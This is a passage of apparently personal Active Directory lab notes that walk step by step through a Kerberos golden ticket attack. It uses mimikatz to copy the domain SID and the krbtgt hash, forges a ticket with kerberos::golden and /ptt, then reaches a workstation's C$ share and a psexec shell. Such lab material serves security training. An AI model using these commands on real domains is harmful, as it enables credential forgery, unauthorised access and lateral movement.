# III. Golden Ticket Attacks

Login to Windows Server machine as Administrator. Move mimikatz to the Downloads folder.

Open the Command line, move to the location we saved mimikatz , and run it.

![gold1.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold1.png)

Copy the SID of the domain:

![gold2.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold2.png)

And the NTLM hash of the krbtgt account:

![gold3.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold3.png)

Paste them into a notepad. These will allow us to generate our golden ticket.

Next we type in the following command to generate the golden ticket:

`kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /id:500 /ptt`

NOTE: The Administrator account has an RID (Relative Identifier) of 500 and `ptt` stands for pass the ticket. This allow use to pass the ticket to the next session to open a command prompt to access any computer we want.

![gold4.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold4.png)

Done!

Next, start a new command prompt with `misc::cmd`. Type in `dir \\UserMachine\c$`(If it doesn’t work, try using the IP address instead).

We’ve accessed the directory of the `FRANKY` machine.

![gold5.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold5.png)

We can take this a step further by using `psexec` and using it against the user machine to get a shell. 

E.g. `psexec.exe \\UserMachine cmd.exe`

![gold6.png](III%20Golden%20Ticket%20Attacks%20026d9b95751b466798b969c4c80a83dc/gold6.png)